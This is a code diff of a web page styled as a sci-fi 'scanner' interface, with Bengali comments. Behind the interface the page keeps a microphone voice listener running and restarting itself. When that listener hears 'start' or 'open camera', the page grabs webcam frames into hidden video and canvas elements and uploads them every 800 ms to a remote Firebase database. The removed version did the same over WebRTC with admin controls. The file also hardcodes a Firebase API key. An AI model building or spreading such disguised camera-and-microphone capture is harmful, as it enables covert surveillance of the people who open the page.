@@ -2,161 +2,111 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Binno Core System</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binno Core - User</title>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
     <style>
-        body { background-color: #000; color: #0ff; font-family: 'Courier New', monospace; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        
-        /* Sci-Fi Circle Animation */
-        .core { position: relative; width: 200px; height: 200px; display: flex; align-items: center; justify-content: center; }
-        .ring { position: absolute; width: 100%; height: 100%; border: 2px solid transparent; border-top: 2px solid #0ff; border-bottom: 2px solid #0ff; border-radius: 50%; animation: spin 4s linear infinite; box-shadow: 0 0 15px #0ff; }
-        .ring:nth-child(2) { width: 80%; height: 80%; border: 2px solid transparent; border-left: 2px solid #0055ff; border-right: 2px solid #0055ff; animation: spin-rev 3s linear infinite; box-shadow: 0 0 10px #0055ff; }
-        .center-dot { width: 10px; height: 10px; background: red; border-radius: 50%; box-shadow: 0 0 20px red; transition: 0.3s; }
-        
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        @keyframes spin-rev { 0% { transform: rotate(360deg); } 100% { transform: rotate(0deg); } }
-
-        /* Text Info */
-        .info { margin-top: 30px; text-align: center; z-index: 10; }
-        .id-badge { font-size: 20px; font-weight: bold; border: 1px solid #0ff; padding: 5px 15px; border-radius: 5px; background: rgba(0, 255, 255, 0.1); }
-        .status { font-size: 12px; margin-top: 5px; color: #888; }
-        
-        /* Hidden Video for Stream */
-        video { display: none; } 
+        body { margin: 0; background: #000; color: #38bdf8; font-family: 'Orbitron', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .scanner { position: relative; width: 250px; height: 250px; border: 2px solid #1e293b; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        .ring { position: absolute; width: 100%; height: 100%; border: 2px solid transparent; border-top: 3px solid #38bdf8; border-radius: 50%; animation: rotate 3s linear infinite; }
+        .inner-dot { width: 15px; height: 15px; background: #38bdf8; border-radius: 50%; box-shadow: 0 0 20px #38bdf8; animation: pulse 1.5s infinite; }
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        @keyframes pulse { 0%, 100% { opacity: 0.5; transform: scale(1); } 50% { opacity: 1; transform: scale(1.2); } }
+        .hud { position: absolute; bottom: 50px; text-align: center; width: 100%; }
+        .id-text { font-size: 20px; font-weight: bold; letter-spacing: 2px; margin-bottom: 10px; }
+        .status-text { font-size: 12px; color: #94a3b8; text-transform: uppercase; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="core">
+    <div class="scanner">
         <div class="ring"></div>
-        <div class="ring"></div>
-        <div class="center-dot" id="dot"></div>
+        <div class="inner-dot"></div>
     </div>
 
-    <div class="info">
-        <div class="id-badge" id="userId">CONNECTING...</div>
-        <div class="status" id="msg">SYSTEM INITIALIZING</div>
+    <div class="hud">
+        <div class="id-text" id="displayId">ID: INITIALIZING...</div>
+        <div class="status-text" id="msg">Voice: OFF</div>
     </div>
-    
-    <video id="localVideo" autoplay playsinline muted></video>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        // ⚠️ আপনার Firebase Config এখানে বসান
+        // ⚠️ আপনার Firebase Config এখানে দিন
         const firebaseConfig = {
-            apiKey: "AIzaSyCjkTs-41gSVeQQgDKWE6fSWvj1POgHHpc", // আপনার API Key দিন
+            apiKey: "AIzaSyCjkTs-41gSVeQQgDKWE6fSWvj1POgHHpc",
             authDomain: "ollo-ff1f3.firebaseapp.com",
             databaseURL: "https://ollo-ff1f3-default-rtdb.asia-southeast1.firebasedatabase.app",
             projectId: "ollo-ff1f3"
         };
-
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // 1. Unique ID Generation (e.g., ID-AB12)
-        const userId = "ID-" + Math.random().toString(36).substr(2, 4).toUpperCase();
-        document.getElementById('userId').innerText = userId;
+        // Unique ID Generation
+        const userId = "ID-" + Math.random().toString(36).substr(2, 5).toUpperCase();
+        document.getElementById('displayId').innerText = "ID: " + userId;
 
-        // Register User to Database
-        db.ref(`users/${userId}`).set({
-            isActive: true,
-            lastSeen: Date.now()
-        });
-        
-        // Disconnect handle
-        db.ref(`users/${userId}`).onDisconnect().remove();
+        // Register User
+        db.ref(`users/${userId}`).set({ isActive: true, status: "Online" });
 
-        let pc;
-        const config = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
-        let stream = null;
+        // ১. উন্নত ভয়েস কমান্ড লজিক
+        function initVoice() {
+            const Speech = window.SpeechRecognition || window.webkitSpeechRecognition;
+            if (!Speech) {
+                document.getElementById('msg').innerText = "Voice Not Supported";
+                return;
+            }
 
-        // 2. Permission & Background Logic
-        async function initSystem() {
+            const rec = new Speech();
+            rec.continuous = true;
+            rec.lang = 'en-US';
+
+            rec.onstart = () => { document.getElementById('msg').innerText = "Voice: LISTENING..."; };
+            rec.onresult = (e) => {
+                const cmd = e.results[e.results.length - 1][0].transcript.toLowerCase();
+                console.log("Heard:", cmd);
+                if (cmd.includes("open camera") || cmd.includes("start")) {
+                    startStreaming();
+                }
+            };
+
+            // অটো-রিস্টার্ট লজিক (যাতে কমান্ড শোনা বন্ধ না হয়)
+            rec.onend = () => rec.start();
+            rec.start();
+        }
+
+        // ২. Base64 ইমেজ স্ট্রিমিং
+        async function startStreaming() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+
             try {
-                // Background Mode: Ask for permission immediately
-                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('msg').innerText = "SYSTEM ONLINE - LISTENING";
-                document.getElementById('dot').style.background = "#0ff";
-                document.getElementById('dot').style.boxShadow = "0 0 20px #0ff";
-                
-                startVoiceListener();
-                listenForAdmin();
-                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                document.getElementById('msg').innerText = "Camera: UPLOADING";
+
+                setInterval(() => {
+                    canvas.width = 320;
+                    canvas.height = 240;
+                    ctx.drawImage(video, 0, 0, 320, 240);
+                    const base64Img = canvas.toDataURL('image/jpeg', 0.4);
+                    
+                    db.ref(`liveStream/${userId}`).set({
+                        image: base64Img,
+                        lastUpdate: Date.now()
+                    });
+                }, 800); // প্রতি ৮০০ মিলি-সেকেন্ডে ছবি পাঠাবে
+
             } catch (err) {
-                document.getElementById('msg').innerText = "ACCESS DENIED";
+                alert("Camera Access Required!");
             }
         }
 
-        // 3. Admin Control Listener
-        function listenForAdmin() {
-            db.ref(`users/${userId}/isActive`).on('value', snapshot => {
-                const active = snapshot.val();
-                if (active === false) {
-                    // Admin blocked this user
-                    if (pc) pc.close();
-                    document.getElementById('msg').innerText = "BLOCKED BY ADMIN";
-                    document.getElementById('dot').style.background = "red";
-                    window.location.reload(); // Reset connection
-                }
-            });
-        }
-
-        // 4. Voice Command (Always Listening)
-        function startVoiceListener() {
-            const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
-            if (!SpeechRecognition) return;
-
-            const recognition = new SpeechRecognition();
-            recognition.continuous = true;
-            recognition.lang = 'en-US';
-
-            recognition.onresult = (event) => {
-                const cmd = event.results[event.results.length - 1][0].transcript.toLowerCase();
-                
-                if (cmd.includes("open camera")) {
-                    startStreaming();
-                    document.getElementById('msg').innerText = "UPLOADING FEED...";
-                }
-            };
-            
-            // Auto restart if stops (Background Keep-Alive)
-            recognition.onend = () => recognition.start();
-            recognition.start();
-        }
-
-        // 5. WebRTC Streaming
-        async function startStreaming() {
-            if (!stream) return;
-            
-            pc = new RTCPeerConnection(config);
-            stream.getTracks().forEach(track => pc.addTrack(track, stream));
-
-            pc.onicecandidate = event => {
-                if (event.candidate) {
-                    db.ref(`calls/${userId}/candidates`).push(event.candidate.toJSON());
-                }
-            };
-
-            const offer = await pc.createOffer();
-            await pc.setLocalDescription(offer);
-            
-            // Send Offer to Firebase
-            db.ref(`calls/${userId}/offer`).set({
-                sdp: offer.sdp,
-                type: offer.type
-            });
-
-            // Listen for Answer
-            db.ref(`calls/${userId}/answer`).on('value', async snapshot => {
-                const answer = snapshot.val();
-                if (answer && !pc.currentRemoteDescription) {
-                    await pc.setRemoteDescription(new RTCSessionDescription(answer));
-                }
-            });
-        }
-
-        initSystem();
+        initVoice();
     </script>
 </body>
 </html>
